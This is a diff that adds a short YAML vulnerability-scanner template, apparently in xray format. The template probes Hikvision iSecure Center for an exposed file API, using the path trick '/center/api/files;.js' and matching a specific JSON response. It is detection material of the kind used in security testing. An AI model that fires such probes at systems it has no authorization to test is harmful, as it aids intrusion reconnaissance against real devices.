@@ -1,0 +1,11 @@
+name: poc-yaml-hikvision-center-files
+rules:
+  - method: GET
+    path: /center/api/files;.js
+    expression: |
+      response.status == 200 && response.body.bcontains(b'{"code":"0","data":"url is error","msg":""}')
+detail:
+  author: hikvision-center-files
+  links:
+    - https://www.baidu.com
+    - app="HIKVISION-iSecure-Center"
